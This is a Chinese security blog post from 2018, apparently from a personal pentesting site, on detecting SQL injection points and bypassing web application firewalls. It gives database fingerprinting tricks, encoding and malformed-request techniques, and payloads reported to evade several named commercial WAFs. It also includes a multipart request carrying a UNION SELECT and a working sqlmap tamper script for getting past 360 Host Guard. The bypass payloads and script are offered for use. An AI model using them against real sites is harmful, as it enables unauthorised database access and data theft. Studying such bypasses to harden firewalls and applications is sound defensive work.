@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <title>sql-injection-fuck-waf</title>
+  <meta name="description" content="0x0 前言 0x1 注入点检测 0x2 bypass waf 0x3 自动化">
+  <meta name="author" content="leopardpan">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="sql-injection-fuck-waf">
+  <meta name="twitter:description" content="0x0 前言 0x1 注入点检测 0x2 bypass waf 0x3 自动化">
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="sql-injection-fuck-waf">
+  <meta property="og:description" content="0x0 前言 0x1 注入点检测 0x2 bypass waf 0x3 自动化">
+  
+  <link rel="icon" type="image/png" href="/images/favicon.png" />
+  <link href="/images/favicon.png" rel="shortcut icon" type="image/png">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="canonical" href="http://localhost:4000/2018/06/sql-injection-fuck-waf/">
+  <link rel="alternate" type="application/rss+xml" title="whynot" href="http://localhost:4000/feed.xml">
+  
+  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
+
+<!-- 站点统计 -->
+  <script 
+  async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+  </script>  
+
+<!-- 百度统计 -->
+  
+  <script>
+      var _hmt = _hmt || [];
+      (function() {
+        var hm = document.createElement("script");
+        hm.src = "//hm.baidu.com/hm.js?7e193e944675994f2e720fe92e3b32f1";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+      })();
+  </script>
+  
+
+<!-- google 统计 -->
+  
+  <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-120601257-1', 'auto');
+      ga('send', 'pageview');
+  </script>
+  
+
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+  (adsbygoogle = window.adsbygoogle || []).push({
+    google_ad_client: "ca-pub-9005224472374751",
+    enable_page_level_ads: true
+  });
+</script>
+
+</head>
+
+
+  <body>
+
+    <span class="mobile btn-mobile-menu">        
+      <div class="nav_container">
+         <nav class="nav-menu-item" style = "float:right">
+            <i class="nav-menu-item">
+              <a href="/#blog" title="" class="blog-button">  博客主页
+              </a>
+            </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/archive" title="archive" class="btn-mobile-menu__icon">
+                      所有文章
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/tags" title="tags" class="btn-mobile-menu__icon">
+                      标签
+                  </a>
+                </i>
+            
+                <i class="nav-menu-item">
+
+                  <a href="/about" title="about" class="btn-mobile-menu__icon">
+                      关于我
+                  </a>
+                </i>
+            
+          </nav>
+      </div>
+    </span>
+    
+    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/images/background-cover.jpg')">
+  <div class="panel-main">
+
+    <div class="panel-main__inner panel-inverted">
+    <div class="panel-main__content">
+        <!-- 头像效果-start -->
+        <div class="ih-item circle effect right_to_left">            
+            <a href="/#blog" title="前往 whynot 的主页" class="blog-button">
+                <div class="img"><img src="/images/avatar.jpg" alt="img"></div>
+                <div class="info">
+                    <div class="info-back">
+                        <h2> 
+                            
+                                whynotke
+                            
+                        </h2>
+                        <p>
+                           
+                                web / sec
+                            
+                        </p>
+                    </div>
+                </div>
+            </a>
+        </div>
+        <!-- 头像效果-end -->
+        <h1 class="panel-cover__title panel-title"><a href="/#blog" title="link to homepage for whynot" class="blog-button">whynot</a></h1>
+        
+        <span class="panel-cover__subtitle panel-subtitle">web sec</span>
+        
+        <hr class="panel-cover__divider" />
+        <p class="panel-cover__description">欢迎来到我的博客~</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary" />
+        
+        
+        
+
+        <div class="navigation-wrapper">
+          <div>
+            <nav class="cover-navigation cover-navigation--primary">
+              <ul class="navigation">
+                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客主页</a></li>
+                
+                  <li class="navigation__item"><a href="/archive" title="archive">所有文章</a></li>
+                
+                  <li class="navigation__item"><a href="/tags" title="tags">标签</a></li>
+                
+                  <li class="navigation__item"><a href="/about" title="about">关于我</a></li>
+                
+              </ul>
+            </nav>
+          </div>          
+        </div>
+
+
+        </div>
+      </div>
+    </div>
+    
+    
+    <div class="panel-cover--overlay cover-clear"></div>
+    
+  </div>
+</header>
+
+
+    <div class="content-wrapper">
+        <div class="content-wrapper__inner">
+            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
+  <header class="post-header">
+    <h1 class="post-title">sql-injection-fuck-waf</h1>
+    <div class="post-meta">
+      <img src="/images/calendar.png" width="20px"/> 
+      <time datetime="2018-06-29 00:00:00 +0800" itemprop="datePublished" class="post-meta__date date">2018-06-29</time>  
+         
+      <span id="busuanzi_container_page_pv"> | 阅读：<span id="busuanzi_value_page_pv"></span>次</span>
+    </p>
+    </div>
+  </header>
+
+  <section class="post">
+    <p>0x0 前言 
+0x1 注入点检测 
+0x2 bypass waf 
+0x3 自动化</p>
+
+<h3 id="0x0-前言">0x0 前言</h3>
+<hr />
+<p>  这里是简单对sql注入绕过waf的一个小总结，非安全研究员，这里不讲原理，关于原理搜集了一些其他大佬的文章（文章在最下面请自取），感谢他们的分享，比着葫芦画瓢，对着各大waf厂商跟着师傅们来一波实战,进行一个简单的总结。</p>
+<h3 id="0x1-注入点检测">0x1 注入点检测</h3>
+<p>  一般的注入还是很好判断的，特别是基于报错，但有的时候略微有些奇葩的环境，再加上一些乱七八糟 waf，就比较难搞了，这里简单总结了一些方法。</p>
+<ul>
+  <li>
+    <p>利用数据库独有的一些函数 <br />
+access  asc chr len #access-functions <br />
+mysql   substring   substr length <br />
+mssql   char ascii len substring    #mssql function str <br />
+oracle  ascii  chr length  substr upper lower replace(x,old,new) <br />
+这些数据库中一个通用的函数就是abs，如果觉得是int型注入不妨先试试2-abs(1),然后结合各类数据库的一些函数来判断是什么数据库的注入,当然对数据库了解越多越好。</p>
+  </li>
+  <li>
+    <p>改变请求方式 <br />
+根据经验，一般情况下各脚本对http request method如下，这里以GET为例子，针对www.vul.com/?id=1来进行判断。 <br />
+php GET <br />
+aspx GET <br />
+asp GET POST COOKIE <br />
+jsp GET POST <br />
+平常渗透测试中总是遇到各种各样的waf，有的时候一个单引号就死了，这个时候首选的一些方法就是转换请求头了，毕竟GET不如POST，POST不如multipart/form-data，当然不要看到php就不去转换，任何情况下都要尝试一下。 <br />
+当然，可以用burp很方便的来进行change request method以及change body encoding。</p>
+  </li>
+</ul>
+
+<p>  之前碰到过一个有趣的例子，asp的站点可以通过cookie提交数据，而且可以使用len函数，可以初步判断为access或者mssql数据库，但是还是很头疼，最后一位大哥使用下面的函数可以判断成功。www.vul.com/2.asp?id=482<br />
+  483-chr(chr(52)&amp;chr(57))    #=482<br />
+  chr(52) ‘4’     <br />
+  chr(57) ‘9’  <br />
+  chr(49) ‘1’ #chr(52)&amp;chr(57)为49 chr(49)为1 虽然最后也没什么卵用但还是挺有意思的</p>
+
+<ul>
+  <li>
+    <p>数据库特性 <br />
+mysql   注释符号# –+ ` ;%00 /<strong>/ 字符串可以使用成对的引号’admin’ = admin’’’ <br />
+mssql   注释符号– /</strong>/ ;%00 <br />
+oracle  注释符号– /**/ admin=adm’||’in<br />
+空白符号
+MySQL5 09 0A 0B 0C 0D A0 20<br />
+Oracle 00 0A 0D 0C 09 20<br />
+MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20<br />
+mysql和mssql可以使用|来进行相关的运算，而oracle会把||当成连接字符。</p>
+  </li>
+  <li>
+    <p>web容器特性<br />
+这里直接可以跳过看http://drops.xmd5.com/static/drops/tips-7883.html 这篇文章</p>
+  </li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. iis+asp(x)  
+    1.%u特性: iis支持对unicode的解析，如:payload为[s%u006c%u0006ect],解析出来后则是[select]
+     %u0061nd 1=1
+    另类%u特性: unicode在iis解析之后会被转换成multibyte，但是转换的过程中可能出现:多个widechar可能会转换为同一个字符。
+    如：select中的e对应的unicode为%u0065，但是%u00f0同样会被转换成为e s%u00f0lect
+    iis+asp
+    2.%特性: union selec%t user fr%om dd #iis+asp asp+iis环境下会忽略掉百分号，如：payload为[sele%ct], 解析出来后则是[select]
+    3.asp/asp.net在解析请求的时候，允许Content-Type: application/x-www-form-urlencoded的数据提交方式select%201%20from%20user
+    asp/asp.net request解析:
+    4.在asp和asp.net中获取用户的提交的参数一般使用request包，当使用request(‘id’)的形式获取包的时候，会出现GET，POST分不清的情况，譬如可以构造一个请求包，METHOD为GET，但是包中还带有POST的内容和POST的content-type, 换一种理解方式也就是将原本的post数据包的method改成GET,如果使用request(‘id’)方式获取数据，仍会获取到post的内容
+2. php+apache畸形的boundary
+    1.php在解析multipart data的时候有自己的特性，对于boundary的识别，只取了逗号前面的内容，例如我们设置的boundary为—-aaaa,123456，php解析的时候只识别了—-aaaa,后面的内容均没有识别。然而其他的如WAF在做解析的时候，有可能获取的是整个字符串，此时可能就会出现BYPASS
+    Content-Type: multipart/form-data; boundary=------,xxxx
+    Content-Length: 191
+    
+    ------,xxxx
+    Content-Disposition: form-data; name="img"; filename="img.gif"
+    
+    GIF89a
+    ------
+    Content-Disposition: form-data; name="id"
+    
+    1' union select null,null,flag,null from flag limit 1 offset 1-- -
+    --------
+    ------,xxxx--
+    2.畸形method(header头中)
+    某些apache版本在做GET请求的时候，无论method为何值均会取出GET的内容。如请求的method名为DOTA，依然会返回GET方法的值，即,可以任意替换GET方法为其它值，但仍能有效工作，但如果waf严格按照GET方法取值，则取不到任何内容
+3. web应用层
+    1.双重URL编码: 即web应用层在接受到经过服务器层解码后的参数后，又进行了一次URL解码
+    2.变换请求方式：
+    在web应用中使用了统一获取参数的方式: 如php里使用$_REQUEST获取参数，但WAF层如果过滤不全则容易bypass，如，waf层过滤了get/post，但没有过滤cookie，而web应用层并不关心参数是否来自cookie
+    urlencode和form-data: POST在提交数据的时候有两种方式，第一种方式是使用urlencode的方式提交，第二种方式是使用form-data的方式提交。当我们在测试的时候，如果发现POST提交的数据被过滤掉了，此时可以考虑使用form-data的方式去提交  
+4. hpp 
+    asp.net + iis：id=1,2,3  #?str=a%27/*&amp;str=*/and/*&amp;str=*/@@version=0--
+    asp + iis ：id=1,2,3
+    php + apache ：id=3
+    jsp + tomcat ：id=1
+</code></pre></div></div>
+<p>这里提供一种针对普通检测的方法，大家可自行发挥。
+mysql int型： %20%26%201=1  mysql.php?id=1%20%26%201=1
+<img src="/images/posts/sql-injection-fuck-waf/1.png" alt="image" />
+另外在字符型中 ‘and’1’=’1是不需要加空格的，有时候也可以绕过一些waf判断
+<img src="/images/posts/sql-injection-fuck-waf/2.png" alt="image" /></p>
+
+<h3 id="0x2-bypasswaf">0x2 bypasswaf</h3>
+<p>由于mysql的灵活性，这里以mysql绕过为主，针对各大主流waf厂商进行一个测试，主要测试在线版的，本地就安装了一个360主机卫士。
+其中http://192.168.44.132/mysql.php?id=1是我本地的一个测试环境<br />
+其中下面的绕过都是以fuzz为主，不考虑web容器的特性，尝试绕过联合查询 -1 union select 1，2，3 from dual</p>
+<ul>
+  <li>百度云加速bypass<br />
+union select    #filter<br />
+from dual   #not filted<br />
+select from dual    #filter<br />
+只需要绕过select即可 使用–+aaaaaa%0a可bypass<br />
+<img src="/images/posts/sql-injection-fuck-waf/3.png" alt="image" /></li>
+  <li>360主机卫士bypass <br />
+发现%23%0aand%230a1=1    可以绕过and 1=1 限制<br />
+最后在union select from的时候却绕不过去  <br />
+直接使用大字符串来fuzz %23-FUZZ-%0a https://github.com/minimaxir/big-list-of-naughty-strings/blob/master/blns.txt 发现可以成功绕过waf<br />
+<img src="/images/posts/sql-injection-fuck-waf/4.png" alt="image" /></li>
+  <li>云锁<br />
+union select 如下就可以绕过<br />
+http://www.yunsuo.com.cn/download.html?id=1%20union/<em>!/</em>!select%201,2,3*/<br />
+转换成multiform/data可轻松绕过 
+<img src="/images/posts/sql-injection-fuck-waf/7.png" alt="image" /></li>
+  <li>安全狗bypass<br />
+直接搞就行了
+<img src="/images/posts/sql-injection-fuck-waf/6.png" alt="image" />
+当然也可以chunked提交
+<img src="/images/posts/sql-injection-fuck-waf/chunked.png" alt="image" /></li>
+  <li>阿里云 <br />
+尝试使用自定义变量方式来绕过 @a:=(select @b:=<code class="highlighter-rouge">table_name</code>from{a information_schema.<code class="highlighter-rouge">TABLES</code> }limit 0,1)union select ‘1’,@a<br />
+@p:=(select)被过滤 fuzz下p参数使用@$:=(select)可以绕过<br />
+union select 1被过滤   使用union%23aa%0a/<em>!select–%01%0a</em>/1,@$,3 可以绕过 <br />
+发现重点就是绕过表名 select 1 from dual 一些常规的方法测试无果 随便fuzz下注释/<em>!数字</em>/却偶然发现有俩个数据包遗漏<br />
+想起了以前乌云上一哥的的一个漏洞https://wooyun.shuimugan.com/bug/view?bug_no=94367
+<img src="/images/posts/sql-injection-fuck-waf/alifuzz1.png" alt="image" />
+难道是因为访问频率导致遗漏？随即我又进行了一些fuzz fuzz1w到5w数字型的注释 加大线程 发现遗漏了更多<br />
+<img src="/images/posts/sql-injection-fuck-waf/alifuzz2.png" alt="image" />
+我想测试一下之前的waf挑战赛，发现之前提交的payload已经修复了，而且那个漏洞url无法访问了:(  所以无法确认。<br />
+随即我又进行了一些超长字符串的fuzz 简单fuzz1w-10w 以500为step 发现现象更多了 可初步判断存在遗漏
+<img src="/images/posts/sql-injection-fuck-waf/alifuzz4.png" alt="image" />
+    <h3 id="0x3-自动化">0x3 自动化</h3>
+    <p>以360主机卫士为例，编写sqlmap tamper脚本。<br />
+正常无waf sqlmap联合查询如下：<br />
+<img src="/images/posts/sql-injection-fuck-waf/sqlmap.png" alt="image" />
+开启主机卫士，放到浏览器调试，修改相关payload使其能正常运行。
+最后tamper脚本如下：</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from lib.core.enums import PRIORITY
+from lib.core.settings import UNICODE_ENCODING
+__priority__ = PRIORITY.LOW
+def dependencies():
+  pass
+def tamper(payload, **kwargs):
+  """
+  Replaces keywords
+  &gt;&gt;&gt; tamper('UNION SELECT id FROM users')
+  '1 union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/ NULL,/*!12345CONCAT*/(0x7170706271,IFNULL(/*!12345CASt(*/COUNT(*) AS CHAR),0x20),0x7171786b71),NULL/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x61646d696e AND table_schema=0x73716c696e6a656374--
+  """
+  if payload:
+      payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
+      payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
+      payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/")
+      payload=payload.replace("CONCAT","/*!12345CONCAT*/")
+      payload=payload.replace("CAST(","/*!12345CAST(*/")
+      payload=payload.replace("CASE","/*!12345CASE*/")
+      payload=payload.replace("DATABASE()","database/**/()")
+                
+  return payload
+</code></pre></div>    </div>
+    <p>可以成功获取到相关数据。
+<img src="/images/posts/sql-injection-fuck-waf/sqlmap2.png" alt="image" />
+其他参考链接如下：</p>
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://www.anquan.us/search?keywords=bypass&amp;content_search_by=by_bugs
+http://drops.xmd5.com/static/drops/tips-7883.html
+https://xianzhi.aliyun.com/forum/attachment/big_size/wafbypass_sql.pdf
+http://drops.xmd5.com/static/drops/papers-4323.html  
+https://www.cnblogs.com/xiaozi/p/6927348.html  
+http://swende.se/blog/HTTPChunked.html#  
+https://xz.aliyun.com/t/1239
+http://www.sqlinjectionwiki.com/categories/2/mysql-sql-injection-cheat-sheet/  
+https://mp.weixin.qq.com/s/S318-e4-eskfRG38HZk_Qw  
+https://joychou.org/web/nginx-Lua-waf-general-bypass-method.html    #nginx lua waf  
+https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF  
+https://websec.ca/kb/sql_injection#MySQL_Comment_Out_Query  
+https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>转载请注明：<a href="https://notwhy.github.io/">whynot</a> » <a href="https://notwhy.gitbooks.io/2018/06/sql-injection-fuck-waf/">sql-injection-fuck-waf</a></p>
+
+
+
+  </section>
+</article>
+
+<section>
+
+            <div class="content-play">
+              <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang" title="打赏，支持一下">打赏一个呗</a></p>
+              <div class="hide_box-play"></div>
+              <div class="shang_box-play">
+                <a class="shang_close-play" href="javascript:void(0)" onclick="dashangToggle()" title="关闭"><img src="/images/payimg/close.jpg" alt="取消" /></a>
+                <div class="shang_tit-play">
+                  <p>感谢您的支持，我会继续努力的!</p>
+                </div>
+                <div class="shang_payimg">
+                    <img src="/images/payimg/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+              <div class="shang_payimg">    
+                    <img src="/images/payimg/weipayimg.jpg" alt="扫码支持" title="扫一扫" />
+                </div>
+                <div class="pay_explain">扫码打赏，你说多少就多少</div>
+                <div class="shang_payselect">
+                  <div class="pay_item checked" data-id="alipay">
+                    <span class="pay_logo"><img src="/images/payimg/alipay.jpg" alt="支付宝" /></span>
+                  </div>
+                  <div class="pay_item" data-id="weipay">
+                    <span class="pay_logo"><img src="/images/payimg/wechat.jpg" alt="微信" /></span>
+                  </div>
+                </div>
+                <div class="shang_info-play">
+                  <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+                </div>
+              </div>
+            </div>
+            <script type="text/javascript">
+            function dashangToggle(){
+              $(".hide_box-play").fadeToggle();
+              $(".shang_box-play").fadeToggle();
+            }
+            </script>
+
+            <div style="text-align:center;margin:50px 0; font:normal 14px/24px 'MicroSoft YaHei';"></div>
+
+            <style type="text/css">
+              .content-play{width:80%;margin-top: 20px;margin-bottom: 10px;height:40px;}
+              .hide_box-play{z-index:999;filter:alpha(opacity=50);background:#666;opacity: 0.5;-moz-opacity: 0.5;left:0;top:0;height:99%;width:100%;position:fixed;display:none;}
+              .shang_box-play{width:540px;height:540px;padding:10px;background-color:#fff;border-radius:10px;position:fixed;z-index:1000;left:50%;top:50%;margin-left:-280px;margin-top:-280px;border:1px dotted #dedede;display:none;}
+              .shang_box-play img{border:none;border-width:0;}
+              .dashang{display:block;width:100px;margin:5px auto;height:25px;line-height:25px;padding:10px;background-color:#E74851;color:#fff;text-align:center;text-decoration:none;border-radius:10px;font-weight:bold;font-size:16px;transition: all 0.3s;}
+              .dashang:hover{opacity:0.8;padding:15px;font-size:18px;}
+              .shang_close-play{float:right;display:inline-block;
+                margin-right: 10px;margin-top: 20px;
+              }
+              .shang_logo{display:block;text-align:center;margin:20px auto;}
+              .shang_tit-play{width: 100%;height: 75px;text-align: center;line-height: 66px;color: #a3a3a3;font-size: 16px;background: url('/images/payimg/cy-reward-title-bg.jpg');font-family: 'Microsoft YaHei';margin-top: 7px;margin-right:2px;}
+              .shang_tit-play p{color:#a3a3a3;text-align:center;font-size:16px;}
+              .shang_payimg{width:140px;padding:10px;padding-left: 80px; /*border:6px solid #EA5F00;**/margin:0 auto;border-radius:3px;height:140px;display:inline-block;}
+              .shang_payimg img{display:inline-block;margin-right:10px;float:left;text-align:center;width:140px;height:140px; }
+              .pay_explain{text-align:center;margin:10px auto;font-size:12px;color:#545454;}
+              .shang_payselect{text-align:center;margin:0 auto;margin-top:40px;cursor:pointer;height:60px;width:500px;margin-left:110px;}
+              .shang_payselect .pay_item{display:inline-block;margin-right:140px;float:left;}
+              .shang_info-play{clear:both;}
+              .shang_info-play p,.shang_info-play a{color:#C3C3C3;text-align:center;font-size:12px;text-decoration:none;line-height:2em;}
+            </style>
+
+       <ul class="pager">
+        
+        <li class="previous">
+            <a href="/2018/06/hacking-oracle/" data-toggle="tooltip" data-placement="top" title="hacking-oracle">上一篇：  <span>hacking-oracle</span>
+            </a>
+        </li>
+        
+        
+        <li class="next">
+            <a href="/2018/07/file-upload/" data-toggle="tooltip" data-placement="top" title="file-upload">下一篇：  <span>file-upload</span>
+            </a>
+        </li>
+        
+    </ul>
+</section>
+
+<section class="post-comments">
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+    
+    var disqus_config = function () {
+        this.page.url = "http://localhost:4000/2018/06/sql-injection-fuck-waf/";
+        this.page.identifier = "/2018/06/sql-injection-fuck-waf/";
+    };
+    var disqus_shortname = 'whynot1';
+    
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>要查看<a href="http://disqus.com/?ref_noscript"> Disqus </a>评论，请启用 JavaScript</noscript>
+    
+  
+
+</section>
+
+
+            <section class="footer">
+    <footer>
+        <div class = "footer_div">  
+        <nav class="cover-navigation navigation--social">
+          <ul class="navigation">
+
+          
+
+          
+          <!-- Github -->
+          <li class="navigation__item_social">
+            <a href="https://github.com/notwhy" title="@notwhy 的 Github" target="_blank">
+              <i class='social fa fa-github fa-2x'></i>
+              <span class="label">Github</span>
+            </a>
+          </li>
+          
+          
+          
+          <!-- Twitter -->
+          <li class="navigation__item_social">
+            <a href="http://twitter.com/whynotke" title="@whynotke" target="_blank">
+              <i class='social fa fa-twitter fa-2x'></i>
+              <span class="label">Twitter</span>
+            </a>
+          </li>
+          
+
+          
+
+          <!-- RSS -->
+          <li class="navigation__item_social">
+            <a href="/feed.xml" rel="author" title="RSS" target="_blank">
+              <i class='social fa fa-rss fa-2x'></i>
+              <span class="label">RSS</span>
+            </a>
+          </li>
+
+          
+          <!-- Email -->
+          <li class="navigation__item_social">
+            <a href="mailto:547103907@qq.com" title="Contact me">
+              <i class='social fa fa-envelope fa-2x'></i>
+              <span class="label">Email</span>
+            </a>
+          </li>
+          
+
+          </ul>
+        </nav>
+
+        </div>
+
+        <div class = "footer_div">  
+           <p class="copyright text-muted">
+            Copyright &copy; whynot 2018 Theme by <a href="http://baixin.io/">leopardpan</a> |
+            </p>
+        	<div align="right">
+    			<link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+          <!-- 访问统计 -->
+          <span id="busuanzi_container_site_pv">
+            本站总访问量
+            <span id="busuanzi_value_site_pv"></span>次
+          </span>
+
+        </div>
+        <div>
+    </footer>
+</section>
+
+        </div>
+    </div>
+    
+    <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
+<script type="text/javascript" src="/js/main.js"></script>
+
+<script type="text/javascript" src="/js/highlight.pack.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+    
+  </body>
+
+</html>
